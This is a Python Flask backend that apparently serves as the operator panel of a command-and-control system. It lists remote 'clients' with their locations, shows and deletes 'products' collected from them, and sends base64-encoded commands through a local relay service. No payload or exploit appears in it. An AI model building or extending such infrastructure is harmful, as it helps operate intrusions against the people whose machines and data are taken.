from PassionFruit.backend import transformer
from PoopBiter import logger
from PoopBiter import products
from PoopBiter.fig import get_fig, list_figs
from PoopBiter.products import PRODUCT_TYPE_TO_STRING, Product, ProductInfo
from flask import Flask, send_from_directory, request, jsonify
from flask_cors import CORS
from flask import request
import requests
import os
import base64
from pathlib import Path
import json

from PoopBiter.releases import list_releases
from PoopBiter.templates import list_templates
from PoopBiter.utils import format_exception, is_int


CNC_ROOT = "CornCake"

app = Flask(__name__, static_folder='frontend/build')
# Configure CORS to allow all methods and headers
CORS(app, resources={
    r"/*": {
        "origins": "*",
        "methods": ["GET", "POST", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization"]
    }
})

CHERRY_URL = 'http://localhost:8000'


@app.route('/api/clients', methods=['GET'])
def get_clients():
    try:
        response = requests.get(f'{CHERRY_URL}/get-clients')
        return jsonify(response.json()), response.status_code
    except requests.exceptions.RequestException as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/clients/<client_id>', methods=['GET'])
def get_client(client_id):
    try:
        response = requests.get(f'{CHERRY_URL}/get-client/{client_id}')
        client_data = response.json()
        
        if 'location' not in client_data or client_data['location'] is None:
            client_data['location'] = "Unknown"

        client_data['nickname'] = client_data.get('nickname', None)

        # Parse each product's content
        if 'products' in client_data:
            parsed_products = {}
            product_paths = {}  # Map product IDs to their paths

            # Handle products as a list
            for product_path in client_data['products']:
                path = Path(product_path)
                try:
                    info = ProductInfo.from_path(path)
                    product_paths[info.product_id] = product_path
                except Exception as ex:
                    logger.error(
                        f"failed to parse product info '{product_path}': {format_exception(ex)}")
                    continue

                try:
                    product = Product.from_path(path)
                    parsed_products[product.info.product_id] = product.displayable(
                    )
                except Exception as ex:
                    error_message = f"failed to parse product {info} at '{product_path}': {format_exception(ex)}"
                    logger.error(error_message)
                    parsed_products[info.product_id] = {
                        **info.displayable(),
                        f"formatted_type": f"{PRODUCT_TYPE_TO_STRING[info.product_type]} (Invalid)",
                        f"error": error_message
                    }

            # Replace products list with IDs and add the mappings
            client_data['products'] = [product[0] for product in sorted(
                parsed_products.items(), key=lambda product: product[1]["creation_time"], reverse=True)]
            client_data['product_paths'] = product_paths
            client_data['parsed_products'] = parsed_products

        return jsonify(client_data), response.status_code
    except Exception as ex:
        error_message = f"endpoint /api/clients failed for client id {client_id}: {format_exception(ex)}"
        logger.error(error_message)
        return jsonify({"error": error_message}), 500


@app.route('/api/set-nickname/<client_id>', methods=['POST'])
def set_nickname(client_id):
    try:
        nickname = request.args.get('nickname', None)
        if nickname is None:
            raise ValueError(
                "pass the client nickname through 'nickname' query parameter")
        response = requests.post(
            f'{CHERRY_URL}/set-nickname/{client_id}?nickname={nickname}')
        return {}, response.status_code
    except Exception as ex:
        error_message = f"endpoint /api/set-nickname failed for client id {client_id}: {format_exception(ex)}"
        logger.error(error_message)
        return jsonify({"error": error_message}), 500


@app.route('/api/delete-product/<client_id>', methods=['POST'])
def delete_product(client_id):
    try:
        product_name = request.args.get('product_name', None)
        command_id = request.args.get('command_id', None)
        if product_name is None or command_id is None:
            raise ValueError(
                "pass product details through query parameters 'product_name' and 'command_id'")

        path = products.ids_to_path(client_id, command_id, product_name)
        if not path.exists():
            return jsonify({"error": "product not found"}), 404

        path.unlink()
        logger.info(f"deleted product {path}")
        return jsonify({"status": "success"})
    except Exception as ex:
        error_message = f"endpoint /api/delete-product failed for client id {client_id}: {format_exception(ex)}"
        logger.error(error_message)
        return jsonify({"error": error_message}), 500


@app.route('/api/commands', methods=['POST', 'OPTIONS'])
def send_command():
    if request.method == 'OPTIONS':
        return '', 204
    
    try:
        command_data = request.json.get('data', '')

        parsed_command_data = json.loads(command_data)
        transformer.transform_command(parsed_command_data)

        command_data = json.dumps(parsed_command_data)

        client_id = request.json.get('client_id', '')

        encoded_data = base64.b64encode(command_data.encode()).decode()

        payload = {
            'client_id': client_id,
            'data': encoded_data
        }
        
        response = requests.post(f'{CHERRY_URL}/send-command', json=payload)
        return jsonify(response.json()), response.status_code
    except Exception as ex:
        error_message = f"endpoint /api/commands failed: {format_exception(ex)}"
        logger.error(error_message)
        return jsonify({"error": error_message}), 500

@app.route('/api/command-templates', methods=['GET'])
def get_command_templates():
    templates = [
        {
            'name': path.stem,
            'content': json.loads(path.read_text())
        } for path in list_templates()
    ]

    return jsonify(templates)


@app.route('/api/releases', methods=['GET'])
def endpoint_releases():
    return jsonify(list(list_releases().keys()))


@app.route('/api/fig-ids', methods=['GET'])
def endpoint_figs():
    return jsonify([{"id": fig.fig_id, "name": fig.name} for fig in list_figs()])


@app.route('/api/operation-types', methods=['GET'])
def endpoint_operation_types():
    operation_types = []
    for fig in list_figs():
        operation_types += [
            {
                "value": key,
                "name": f"{value} ({fig.name})"
            } for key, value in fig.operations.items() if value != "RESERVED"
        ]
    return jsonify(operation_types)


# Serve React App
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve(path):
    logger.info(f"serving path '{path}'")
    if path.startswith('api/'):
        return jsonify({'error': 'Not found'}), 404
    if path != "" and os.path.exists(app.static_folder + '/' + path):
        return send_from_directory(app.static_folder, path)
    else:
        return send_from_directory(app.static_folder, 'index.html')
